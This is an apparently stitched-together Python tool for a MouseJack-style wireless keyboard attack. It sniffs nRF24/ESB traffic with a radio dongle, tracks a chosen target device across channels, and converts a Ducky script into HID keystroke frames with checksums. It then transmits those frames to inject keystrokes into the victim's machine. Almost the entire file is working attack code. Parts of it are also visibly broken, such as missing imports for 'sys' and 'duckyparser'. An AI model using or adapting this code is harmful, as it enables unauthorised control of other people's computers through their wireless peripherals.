#!/usr/bin/env python3

from usb.core import find as finddev

import os
import codecs, time, logging, usb
from lib import common

# Parse command line arguments and initialize the radio
common.init_args('./nrf24-sniffer.py')
common.parser.add_argument('-p', '--prefix', type=str, help='Promiscuous mode address prefix', default='')
common.parser.add_argument('-d', '--dwell', type=float, help='Dwell time per channel, in milliseconds', default='100')
common.parse_and_init()

# Parse the prefix addresses
prefix_address = codecs.decode(common.args.prefix.replace(':', ''), 'hex')
if len(prefix_address) > 5:
  raise Exception('Invalid prefix address: {0}'.format(args.address))

# Put the radio in promiscuous mode
common.radio.enter_promiscuous_mode(prefix_address)

# Convert dwell time from milliseconds to seconds
dwell_time = common.args.dwell / 1000

# Set the initial channel
common.radio.set_channel(common.channels[0])

# Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
last_tune = time.time()
first_time = time.time()
channel_index = 0
while time.time() - first_time < 30:

  # Increment the channel
  if len(common.channels) > 1 and time.time() - last_tune > dwell_time:
    channel_index = (channel_index + 1) % (len(common.channels))
    common.radio.set_channel(common.channels[channel_index])
    last_tune = time.time()

  # Receive payloads
  value = common.radio.receive_payload()
  if len(value) >= 5:

    # Split the address and payload
    address, payload = value[0:5], value[5:]

    # Log the packet
    logging.info('{0: >2}  {1: >2}  {2}  {3}'.format(
              common.channels[channel_index],
              len(payload),
              ':'.join('{:02X}'.format(b) for b in address),
              ':'.join('{:02X}'.format(b) for b in payload)))
              
dev = finddev(idVendor=0x1915, idProduct=0x0102)
dev.reset()
time.sleep(2)
address = input("input the address you want to sniff: ")
os.system("python3 ./attack.py -a {0}".format(address))


###############################################################################################################


# parsing the args expression
common.init_args(f'./attack.py')
common.parser.add_argument('-a', '--address', type=str, help='Address to sniff, following as it changes channels', required=True)
common.parser.add_argument('-t', '--timeout', type=float, help='Channel timeout, in milliseconds', default=100)
common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=250)
common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default=1, choices=range(0, 16), metavar='RETRIES')
common.parser.add_argument('-p', '--ping_payload', type=str, help='Ping payload, ex 0F:0F:0F:0F', default='0F:0F:0F:0F', metavar='PING_PAYLOAD')
common.parse_and_init()


# Parse the address
address = codecs.decode(common.args.address.replace(':', ''), 'hex').decode('latin1')[::-1][:5] # Decoding the address for the dongle
address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1]) # Reverse the address for the return values
if len(address) < 2:
  raise Exception('Invalid address: {0}'.format(common.args.address))

# Put the radio in sniffer mode
common.radio.enter_sniffer_mode(address)

# Convert channel timeout from milliseconds to seconds
timeout = float(common.args.timeout) / float(1000)

# Parse the ping payload
ping_payload = codecs.decode(common.args.ping_payload.replace(':', ''), 'hex').decode('ascii') #convert the ping payload to hex and the decode to ascii

# Format the ACK timeout and auto retry values
ack_timeout = int(common.args.ack_timeout / 250) - 1
ack_timeout = max(0, min(ack_timeout, 15))
retries = max(0, min(common.args.retries, 15))

# Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
first_time = time.time()
last_ping = time.time()
channel_index = 0
channels_index  = []

#Start the sniffing mode and show all the results
print("    time                  ch   len      address         payload")
print("    ----                  --   ----    ---------        ---------")
while time.time() - first_time < 60:

  # Follow the target device if it changes channels
  if time.time() - last_ping > timeout:

    # First try pinging on the active channel
    if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

      # Ping failed on the active channel, so sweep through all available channels
      success = False
      for channel_index in range(len(common.channels)):
        common.radio.set_channel(common.channels[channel_index])
        if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

          # Ping successful, exit out of the ping sweep
          last_ping = time.time()
          if channel_index not in channels_index: 
          	channels_index.append(common.channels[channel_index])
          success = True
          break

    # Ping sweep failed
    if not success: logging.debug('Unable to ping {0}'.format(address_string)) #########

    # Ping succeeded on the active channel
    else:
      print ('Ping success on channel {0}'.format(common.channels[channel_index]))
      last_ping = time.time()
    
  # Receive payloads
  value = common.radio.receive_payload()
  if value[0] == 0:

    # Reset the channel timer
    last_ping = time.time()

    # Split the payload from the status byte
    payload = value[1:]

    # Log the packet
    logging.info('{0: >2}  {1: >2}  {2}  {3}'.format(
              common.channels[channel_index],
              len(payload),
              address_string,
              ':'.join('{:02X}'.format(b) for b in payload)))



#########################################################################################################################
############################# Ducky script parsing#######################################################################

payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
keepalive = [0x00, 0x40, 0x01, 0x16, 0xA9]
hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]

# Calculating the checksum for the packet and add it
def checksum(payload):
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

# The key function for the packet
def key_fun(payload, key):
	payload[2] = key['mod']
	payload[3] = key['hid']
	return payload

# building the frame
def frame(key={'hid': 0, 'mod': 0}):
	return checksum(key_fun(payload_template[:], key))

ducky_script = input("enter the path to the ducky script: ")

# if the path is empty exit
if ducky_script == "": 
	print("You must supply a path to ducky script")
	print("Attacks are disabled.")
	sys.exit(0)
else: # if the path is correct parse the script
        f = open(ducky_script, 'r')
        try:
            parser = duckyparser.DuckyParser(f.read(),layout='us')
        except KeyError:
            print("Invalid layout specified")
            exit(-1)

        attack = parser.parse() # the attack HID packet parsing
        
# creating the whole hid packet with keeoalive and hello frames      
for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(attack) - 1:
                next_key = attack[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([frame(key), 12])
                key['frames'].append([[0x00, 0x40, 0x04, 0xB0, 0x0C], 0])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([frame(), 0])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([keepalive[:], 10])

#################################################################################################
################################### Transmit the payload attack #################################
for channel_index in channels_index:
	common.radio.set_channel(channel_index)
	time.sleep(2)
	print(f"set the channel to {channel_index}")
	for key in attack:
		if key['frames']:
	        	for frame in key['frames']:
	        		if (common.radio.transmit_payload(frame[0]) > 0):
	        			print(str(frame[0]))
	        			time.sleep(1.5)
	        		else:
	        			print("cant transmit")

dev = finddev(idVendor=0x1915, idProduct=0x0102)
dev.reset()
time.sleep(2)
